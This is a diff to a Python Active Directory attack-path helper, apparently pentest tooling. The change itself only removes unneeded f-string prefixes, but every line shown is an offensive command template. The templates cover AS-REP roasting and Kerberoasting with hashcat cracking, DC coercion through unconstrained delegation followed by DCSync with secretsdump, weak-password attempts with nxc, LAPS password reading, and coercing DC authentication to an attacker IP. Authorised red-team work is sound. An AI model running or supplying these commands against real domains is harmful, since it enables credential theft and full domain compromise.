@@ -66,7 +66,7 @@ def find_asrep_roastable(G: "nx.DiGraph") -> list[QuickWin]:
             detail="DontReqPreAuth=True — request the AS-REP without credentials.",
             commands=[
                 f"impacket-GetNPUsers '{d}/' -no-pass -usersfile <(echo {_short(name)}) -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash",
-                f"hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
+                "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
             ],
         ))
     return out
@@ -94,7 +94,7 @@ def find_kerberoastable(G: "nx.DiGraph") -> list[QuickWin]:
             detail=f"SPNs: {spn_str}",
             commands=[
                 f"impacket-GetUserSPNs '{d}/<owned_user>:<owned_pass>' -dc-ip <DC_IP> -request-user '{_short(name)}' -outputfile kerb.hash",
-                f"hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
+                "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
             ],
         ))
     return out
@@ -117,10 +117,10 @@ def find_unconstrained_delegation(G: "nx.DiGraph") -> list[QuickWin]:
             detail="If you compromise this host, coerce a DC and capture its TGT from LSASS.",
             commands=[
                 f"# 1. Get local admin on {name}, then start a TGT collector:",
-                f"# Rubeus.exe monitor /interval:1 /nowrap",
+                "# Rubeus.exe monitor /interval:1 /nowrap",
                 f"# 2. Coerce a DC to authenticate to {name}:",
                 f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d {d} -l {name} -t <DC_FQDN>",
-                f"# 3. Use the captured DC TGT to DCSync:",
+                "# 3. Use the captured DC TGT to DCSync:",
                 f"export KRB5CCNAME=DC.ccache && impacket-secretsdump -k -no-pass -just-dc '{d}/<DC_SHORT>$@<DC_FQDN>'",
             ],
         ))
@@ -145,7 +145,7 @@ def find_password_not_required(G: "nx.DiGraph") -> list[QuickWin]:
             detail="ADS_UF_PASSWD_NOTREQD set — try empty / weak password, or set one with a privileged path.",
             commands=[
                 f"nxc smb <DC_IP> -d {d} -u '{_short(name)}' -p '' --no-bruteforce",
-                f"# Or try common short ones:",
+                "# Or try common short ones:",
                 f"nxc smb <DC_IP> -d {d} -u '{_short(name)}' -p '{_short(name)}' '{_short(name)}1' 'Password1'",
             ],
         ))
@@ -171,7 +171,7 @@ def find_laps_readable(G: "nx.DiGraph") -> list[QuickWin]:
             detail="LAPS is deployed on this host — if you control a principal with ReadLAPSPassword, retrieve the local admin password.",
             commands=[
                 f"impacket-GetLAPSPassword '{d}/<owned_user>:<owned_pass>@<DC_IP>' -computer '{_short(name)}'",
-                f"# Or via nxc:",
+                "# Or via nxc:",
                 f"nxc ldap <DC_IP> -d {d} -u '<owned_user>' -p '<owned_pass>' -M laps",
             ],
         ))
@@ -274,7 +274,7 @@ def find_dc_servers(G: "nx.DiGraph") -> list[QuickWin]:
             node_kind="computers",
             detail="Coercion targets: PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM).",
             commands=[
-                f"# Coerce auth from this DC (as any authenticated user):",
+                "# Coerce auth from this DC (as any authenticated user):",
                 f"coercer coerce -u '<owned_user>' -p '<owned_pass>' -d <DOMAIN> -l <ATTACKER_IP> -t {name}",
             ],
         ))
